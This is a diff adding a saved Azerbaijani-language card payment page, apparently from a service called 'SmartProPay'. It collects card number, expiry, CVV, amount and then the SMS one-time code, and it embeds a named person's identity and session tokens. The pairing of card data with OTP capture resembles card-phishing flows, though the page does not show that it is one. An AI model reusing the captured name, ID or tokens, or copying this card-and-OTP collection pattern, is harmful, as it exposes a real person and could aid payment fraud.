@@ -1,0 +1,559 @@
+<html lang="tr"><div id="in-page-channel-node-id" data-channel-name="in_page_channel_9cXoj6"></div><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    
+    <!-- CSS files -->
+    <link href="/template/v1/assets/css/tabler.css" rel="stylesheet">
+    <link href="/template/v1/assets/css/tabler-flags.css" rel="stylesheet">
+    <link href="/template/v1/assets/css/tabler-vendors.css" rel="stylesheet">
+    <link href="/template/v1/assets/css/icons/tabler-icons.min.css?v=2" rel="stylesheet">
+    
+    <link rel="stylesheet" href="/template/v1/assets/libs/meBlock/style.css">
+
+    <link rel="stylesheet" href="/template/v1/assets/libs/toastr/toastr.min.css">
+
+    <link rel="stylesheet" href="/template/v1/assets/libs/fancybox/fancybox.css">
+
+    <link href="/template/v1/assets/libs/fileuploader/style.css" rel="stylesheet">
+
+
+    <link rel="stylesheet" href="/template/v1/assets/css/custom.css">
+    <link rel="icon" type="image/x-icon" href="/favicon.ico">
+
+
+
+    <script src="/template/v1/assets/libs/jquery/jquery-3.6.0.min.js" type="text/javascript"></script>
+    <script src="/template/v1/assets/libs/inputmask/jquery.inputmask.min.js" type="text/javascript"></script>
+    <script src="/template/v1/assets/libs/cardValid/jquery.creditCardValidator.js"></script>
+    <script src="/template/v1/assets/libs/fancybox/fancybox.umd.js" type="text/javascript"></script>
+
+    <script src="/template/v1/assets/libs/meBlock/script.js" type="text/javascript"></script>
+
+    <script src="/template/v1/assets/libs/toastr/toastr.min.js" type="text/javascript"></script>
+
+    <script src="/template/v1/assets/libs/fileuploader/script.js" type="text/javascript"></script>
+
+    <script src="/template/v1/assets/libs/socket/socket.io.min.js"></script>	
+
+    <script src="/template/v1/assets/libs/moment/moment.min.js"></script>	
+    
+    <script src="/template/v1/assets/js/scripts.js?v=3.2" type="text/javascript"></script>
+
+    <script>
+      var theme = window.localStorage.getItem("theme")||"light";
+      var plugin = 'deposit';
+      var page = 'card';
+      var dizin = "";
+      var apiV = "v1";
+      var rc = '9bc5e49a40bd9efd67385cd7bf676f39';
+      var token = 'oHvD5Viu0l1mbpMFGT9kavHm';
+      var socketStatus = false;
+
+    </script>
+    
+          
+    <script>
+      var socketSettings = {
+          host  :"https://websocket.mesoftpanel.com",
+          nsp   : "/client",
+      };
+
+      var socketAuth = {
+          token : "NGEzZjdlYmExMjUxNWFkNDg5ZWM2MjY2Yjc0MTI1ZTU6MTAyOWI1NDEyZjNkMzRkZTkwODc3OGVkYzJmNmQ5OGZlMzNmOWIwMDZlZWQwM2RmOTBmMzQ5NzE2OGI2MTM3ZWExODc1YjlmNmExMDdjYjZlZjA2Zjg4ZTI1NjM3YmUy",
+          user : {
+            uniq  : "67715f661551a",
+            name  : " ",
+            rid   : token
+          }
+      }
+    </script>
+
+
+    <script src="/template/v1/assets/js/socket.js?v=2.2" type="text/javascript"></script>
+  
+
+  <style>
+@keyframes slide-in-one-tap {
+  from {
+    transform: translateY(80px);
+  }
+  to {
+    transform: translateY(0px);
+  }
+}
+
+.trust-hide-gracefully {
+  opacity: 0;
+}
+
+.trust-wallet-one-tap .hidden {
+    display: none;
+  }
+
+.trust-wallet-one-tap .semibold {
+    font-weight: 500;
+  }
+
+.trust-wallet-one-tap .binance-plex {
+    font-family: 'Binance';
+  }
+
+.trust-wallet-one-tap .rounded-full {
+    border-radius: 50%;
+  }
+
+.trust-wallet-one-tap .flex {
+    display: flex;
+  }
+
+.trust-wallet-one-tap .flex-col {
+    flex-direction: column;
+  }
+
+.trust-wallet-one-tap .items-center {
+    align-items: center;
+  }
+
+.trust-wallet-one-tap .space-between {
+    justify-content: space-between;
+  }
+
+.trust-wallet-one-tap .justify-center {
+    justify-content: center;
+  }
+
+.trust-wallet-one-tap .w-full {
+    width: 100%;
+  }
+
+.trust-wallet-one-tap .box {
+    transition: all 0.5s cubic-bezier(0, 0, 0, 1.43);
+    animation: slide-in-one-tap 0.5s cubic-bezier(0, 0, 0, 1.43);
+    width: 384px;
+    border-radius: 15px;
+    background: #FFF;
+    box-shadow: 0px 2px 4px 0px rgba(0, 0, 0, 0.25);
+    position: fixed;
+    right: 30px;
+    bottom: 30px;
+    z-index: 1020;
+  }
+
+.trust-wallet-one-tap .header {
+    gap: 15px;
+    border-bottom: 1px solid #E6E6E6;
+    padding: 10px 18px;
+  }
+
+.trust-wallet-one-tap .header .left-items {
+      gap: 15px
+    }
+
+.trust-wallet-one-tap .header .title {
+      color: #1E2329;
+      font-size: 18px;
+      font-weight: 600;
+      line-height: 28px;
+    }
+
+.trust-wallet-one-tap .header .subtitle {
+      color: #474D57;
+      font-size: 14px;
+      line-height: 20px;
+    }
+
+.trust-wallet-one-tap .header .close {
+      color: #1E2329;
+      cursor: pointer;
+    }
+
+.trust-wallet-one-tap .body {
+    padding: 9px 18px;
+    gap: 10px;
+
+  }
+
+.trust-wallet-one-tap .body .right-items {
+      gap: 10px;
+      width: 100%;
+    }
+
+.trust-wallet-one-tap .body .right-items .wallet-title {
+        color: #1E2329;
+        font-size: 16px;
+        font-weight: 600;
+        line-height: 20px;
+      }
+
+.trust-wallet-one-tap .body .right-items .wallet-subtitle {
+        color: #474D57;
+        font-size: 14px;
+        line-height: 20px;
+      }
+
+.trust-wallet-one-tap .connect-indicator {
+    gap: 15px;
+    padding: 8px 0;
+  }
+
+.trust-wallet-one-tap .connect-indicator .flow-icon {
+      color: #474D57;
+    }
+
+.trust-wallet-one-tap .loading-color {
+    color: #FFF;
+  }
+
+.trust-wallet-one-tap .button {
+    border-radius: 50px;
+    outline: 2px solid transparent;
+    outline-offset: 2px;
+    background-color: rgb(5, 0, 255);
+    border-color: rgb(229, 231, 235);
+    cursor: pointer;
+    text-align: center;
+    height: 45px;
+  }
+
+.trust-wallet-one-tap .button .button-text {
+      color: #FFF;
+      font-size: 16px;
+      font-weight: 600;
+      line-height: 20px;
+    }
+
+.trust-wallet-one-tap .footer {
+    margin: 20px 30px;
+  }
+
+.trust-wallet-one-tap .check-icon {
+    color: #FFF;
+  }
+
+@font-face {
+  font-family: 'Binance';
+  src: url(chrome-extension://egjidjbpglichdcondbcbdnbeeppgdph/fonts/BinancePlex-Regular.otf) format('opentype');
+  font-weight: 400;
+  font-style: normal;
+}
+
+@font-face {
+  font-family: 'Binance';
+  src: url(chrome-extension://egjidjbpglichdcondbcbdnbeeppgdph/fonts/BinancePlex-Medium.otf) format('opentype');
+  font-weight: 500;
+  font-style: normal;
+}
+
+@font-face {
+  font-family: 'Binance';
+  src: url(chrome-extension://egjidjbpglichdcondbcbdnbeeppgdph/fonts/BinancePlex-SemiBold.otf) format('opentype');
+  font-weight: 600;
+  font-style: normal;
+}
+
+</style></head>
+
+
+  
+
+  <body class="theme-light" cz-shortcut-listen="true">
+    <script>if(theme=="dark"){$("body").removeClass("theme-light").addClass("theme-dark")}</script>
+
+    <!--
+    <div class="text-center mb-2">
+        <a href="/" class="navbar-brand navbar-brand-autodark"><img class="logoDarkLight" src="/files/images/logo-light.png" width="150" alt=""></a>
+    </div>
+    <script>if(theme=="dark"){$(".logoDarkLight").attr("src","/files/images/logo-dark.png")}</script>
+    -->
+
+  
+  <div class="page page-center">
+
+<style>
+body{
+    background-color: #14234b;
+}
+
+.card-body .form-label{
+    font-size:16px !important;
+    font-weight: 400;
+    padding: 0rem 1.25rem !important;
+}
+
+.container-tight{
+    padding:10px !important;
+}
+
+.cardTypes{
+    display:none;
+}
+
+.cardTypes img{
+    height:20px; 
+    width:auto;
+    display:none;
+}
+</style>
+
+
+<title>SmartProPay | Card - Secure Payment System</title>
+
+<div class="card container-tight " style="opacity: 1; transition: 0.5s 0.35s;">
+    
+
+    <div class="card bg-white">
+
+        <div class="card-header dblock text-center mt-1">
+            <img src="/files/images/card-logo.png?v=2" alt="Card" height="80">
+        </div>
+
+        <div class="card-body p0 align-items-center">         
+            
+            <div id="wizard" class="wizardElement easyPager" style="position: relative; overflow: hidden;"><div class="wizardWrapper" style="width: 2736px; margin-left: -912px;">
+                <section class="step" data-step="1" style="float: left; width: 456px; height: 1px;">
+
+
+                    <form action="javascript:;">
+                        <div class="row pt-10 p20">
+                            <div class="text-center">
+                                <h3 class="">  Ödəniş Ekranı  </h3>
+                                <h4>Xoş gəldiniz: Vuqar HESENLİ (18671009)</h4>
+                            </div>
+
+                       
+
+                            <div class="col-md-12 mt-3">
+                                <div class="input-group mb-2">
+                                    <span class="input-group-text"> <i class="ti ti-user"></i> </span>
+                                    <input type="text" id="cardname" value="Vuqar HESENLİ" tabindex="-1" name="name_surname" class="form-control" placeholder="Ad Soyad">
+                                </div>
+                            </div>
+                        
+                            <div class="col-md-12">
+                                
+                                <div class="input-group mb-2">
+                                    <span class="input-group-text"> <i class="ti ti-credit-card"></i> </span>
+                                    <input type="text" value="" tabindex="-1" id="cardnum" name="number" class="form-control" placeholder="Kart nömrəsi" autocomplete="off" inputmode="text">
+                                    <span class="input-group-text cardTypes"> 
+                                        <img class="visa" src="/files/images/card-logos/visa.png" alt="visa">
+                                        <img class="mastercard" src="/files/images/card-logos/mastercard.png" alt="mastercard"> 
+                                        <img class="discover" src="/files/images/card-logos/discover.png" alt="discover"> 
+                                        <img class="troy" src="/files/images/card-logos/troy.png" alt="troy"> 
+                                        <img class="visa_electron" src="/files/images/card-logos/visa_electron.png" alt="troy">
+                                        <img class="amex" src="/files/images/card-logos/amex.png" alt="amex">  
+                                        <img class="maestro" src="/files/images/card-logos/maestro.png" alt="maestro">
+                                        <img class="uzcard" src="/files/images/card-logos/uzcard.png" alt="uzcard">  
+                                        <img class="humo" src="/files/images/card-logos/humo.png" alt="humo">
+                                    </span>
+                                </div>
+                            </div>
+
+                            <div class="col-md-6">
+                                
+                                <div class="input-group mb-2">
+                                    <span class="input-group-text"> <i class="ti ti-clock-hour-4"></i> </span>
+                                    <input type="text" value="" tabindex="-1" name="exp_date" class="form-control" placeholder="Ay və İl" inputmode="numeric">
+                                </div>
+                            </div>
+
+                            <div class="col-md-6 mb-4">
+                            
+                                <div class="input-group mb-2">
+                                    <span class="input-group-text"> <i class="ti ti-lock"></i> </span>
+                                    <input type="text" value="" tabindex="-1" name="cvv" class="form-control" placeholder=" CVV2/C" inputmode="text">
+                                </div>
+                            </div>
+
+                            <div class="col-md-12 mb-4">
+                                <div class="input-icon">
+                                    <input type="text" value="" tabindex="-1" name="amount" class="form-control imDecimal" placeholder="Məbləğ girin!" inputmode="decimal" style="text-align: right;">
+                                    <span class="input-icon-addon"> <i class="ti ti-currency-manat"></i> </span>
+                                </div>
+                            </div>
+                            
+
+                            <button type="submit" class="btn bg-green w-100 ptb-15 fs-18  startBtn" tabindex="-1">Ödəməyə başla <i class="ti ti-arrow-big-right-lines fs-20"></i></button>
+                                                        <div class="small text-center mt-10"><b> Əməliyyat üçün qalan vaxt </b> : <span class="text-pink" id="countDownContainer"></span></div>
+                                                        
+            
+                        </div>
+                    </form>
+                </section>
+
+                <section class="step" data-step="2" style="float: left; width: 456px; height: 1px;">
+                    <div class="row p10" id="accountDetail">
+
+                        <h1 class="text-center mt-2">Ödəniş tamamlanır...</h1>
+
+                                                <div class="col-md-12  text-center">
+                            <span class="text-pink fs-18 bold" id="timerContainer"></span>
+                        </div>
+
+                        <div class="col-md-12  text-center">
+                            <img class="text-center" src="/files/images/loading.gif" alt="E-Manat" style="max-height: 100px; width: auto;">
+                        </div>
+                        <h3 class="text-center">Zəhmət olmasa, gözləyin...</h3>
+                        <!--<h5 class="text-center mb-3">Bizi telegramda izləyin 🤗 <a href="https://t.me/smartProPay_news" class="text-indigo bold" target="_blank">https://t.me/smartProPay_news</a></h5>-->
+                        
+                        <hr class="mb-10">
+                        <div class="col-md-12 mb-3 text-center">
+                            <label class=""><b class="text-purple">Bu Ekranı Bağlamayın!</b> Əməliyyatınız tamamlanır, proses zamanı bu ekranı bağlamayın! Əməliyyatınız ən qısa zamanda başa çatacaq.</label>
+                        </div>
+                        <div class="text-center">
+                            <div class="col-auto">
+                                <button class="btn bg-red depositCancel fs-14 ptb-5" tabindex="-1">İmtina et! <i class="ti ti-x "></i></button>
+                            </div>     
+                            
+                            
+                        </div>
+
+                       
+                    </div>
+                </section>
+
+                <section class="step active" data-step="3" style="float: left; width: 456px;">
+                    <div class="row p10" id="smsDetail" style="">
+
+                        <h2 class="text-center mt-2 mb-3 text-lime"><i class="ti ti-message"></i> SMS kodunu daxil edin</h2>
+                        <hr class="mb-10">
+                        <span class="fs-10 text-muted text-center">Zəhmət olmasa Telefonunuza Gələn SMS Kodunu daxil edin!</span>
+                        <div class="col mb-3 mt-2 plr-20">
+                            <input type="text" style="margin:0 auto; " class="form-control" name="sms_code" placeholder="SMS Kodu" inputmode="text">
+                            
+                        </div>
+
+                        <hr class="mb-10">
+                        
+                        <span class="fs-11 text-muted text-center">Zəhmət olmasa telefonunuza gələn SMS kodunu daxil edin və <b class="text-lime">SMS Göndər</b> düyməsini basın.</span>
+
+                        <button class="btn bg-green w-100 ptb-15 mt-3 fs-18 smsSendBtn">SMS Göndər <i class="ti ti-arrow-big-right-lines fs-20"></i></button>
+                       
+                    </div>
+
+                    <div class="row p10" id="appApproval" style="display:none">
+                        <h2 class="text-center mt-2 mb-3 text-lime"><i class="ti ti-device-mobile-message"></i> Ödənişi təsdiqləmək üçün smartfonunuzda Leobank proqramını açın</h2>
+                        <hr class="mb-10">
+                    </div>
+                           
+                    <div class="small text-center mt-5 mb-5"><b> Qalan vaxt </b> : <span class="text-pink" id="smsCountDownContainer">01:43</span></div>
+                </section>
+
+                <section class="step" data-step="4" style="float: left; width: 456px; height: 1px;">
+                    <div class="row">
+                        <div class="col-md-12 pb-20 text-center">
+                            <div class="w100 mt-3">
+                                <i class="ti ti-circle-check text-lime fs-50"></i>
+                            </div>
+                            
+                            <h3 class="text-lime fs-16">Əməliyyat uğurlu oldu!</h3>
+                            <h5 class="fs-14">Depozitiniz uğurla tamamlandı. Bizi seçdiyiniz üçün təşəkkür edirik!</h5>
+                            <h6 class="fs-12">Yeni əməliyyat üçün saytınıza qayıdın... </h6>
+
+                            <h4 class="mt-20 bt-1 pt-20 text-purple returnMsg" style="display:none">Saytınıza yönəldiniz...</h4>
+                        </div>
+                    </div>
+                </section>
+
+                <section class="step" data-step="5" style="float: left; width: 456px; height: 1px;">
+                    <div class="row">
+                        <div class="col-md-12 pb-20 text-center">
+                            <div class="w100 mt-3">
+                                <i class="ti ti-circle-x text-red fs-50"></i>
+                            </div>
+                            
+                            <h3 class="text-red fs-16">Əməliyyat uğursuz oldu!</h3>
+                            <h5 id="declineNotes" class="fs-14">Qeyd etdiyiniz məlumatlar ilə əməliyyat tamamlana bilməz! </h5>
+                            <h6 class="fs-12">Yeni əməliyyat üçün saytınıza qayıdın... </h6>
+
+                            <h4 class="mt-20 bt-1 pt-20 text-purple returnMsg" style="display:none">Saytınıza yönəldiniz...</h4>
+                        </div>
+                    </div>
+                </section>
+
+                <section class="step" data-step="6" style="float: left; width: 456px; height: 1px;">
+                    <div class="row">
+                        <div class="col-md-12 pb-20 text-center">
+                            <div class="w100">
+                                <i class="ti ti-circle-x text-red fs-50"></i>
+                            </div>
+                            
+                            <h3 class="text-red fs-16">Əməliyyatınız ləğv edildi!</h3>
+                            <h6 class="fs-12">Yeni əməliyyat üçün saytınıza qayıdın... </h6>
+
+                            <h4 class="mt-20 bt-1 pt-20 text-purple returnMsg" style="display:none">Saytınıza yönəldiniz...</h4>
+                        </div>
+                    </div>
+                </section>
+
+            </div></div>
+        </div>
+
+
+
+    </div>
+</div>
+
+<!--
+-->
+
+<script>
+    var wStep = 3;
+    var rUrl = '';
+    var timeOutTimer = 201; 
+    var smsTimeOutTimer = 109;
+    var timer_count = 0</script>
+
+
+
+
+  </div>
+
+  <!--
+    <div class="hr-text mb-0">
+        <a href="javascript:;" class="nav-link px-0 hide-theme-dark themeSwitch" data-theme="dark" title="Dark Mode" data-bs-toggle="tooltip" data-bs-placement="bottom">
+            <i class="ti ti-moon"></i>
+          </a>
+          <a href="javascript:;" class="nav-link px-0 hide-theme-light themeSwitch" data-theme="light" title="Light Mode" data-bs-toggle="tooltip" data-bs-placement="bottom">
+              <i class="ti ti-sun"></i>
+          </a>
+    </div>
+-->
+<!--
+    <footer class="footer footer-transparent d-print-none">
+        <div class="container-xl">
+          <div class="row">
+
+            <div class="d-flex">
+
+              <div class="col-auto">
+                    Copyright &copy; 2021-2024 <a href="javascript:;" class="link-secondary">SmartProPay </a>.  All rights reserved.
+              </div>
+
+              <div class="ms-auto">
+                  v1.1.5  
+
+              </div>
+            </div>
+          </div>
+        </div>
+    </footer>
+-->
+  
+
+
+
+  <script src="/template/v1/assets/js/tabler.min.js"></script>
+
+  <!-- Google tag (gtag.js) -->
+  <script async="" src="https://www.googletagmanager.com/gtag/js?id=G-BFEV5RPECE"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-BFEV5RPECE');
+  </script>
+
+
+<div id="veepn-breach-alert"></div><style>@font-face{font-family:FigtreeVF;src:url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2 supports variations"),url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2-variations");font-weight:100 1000;font-display:swap}</style></body></html>
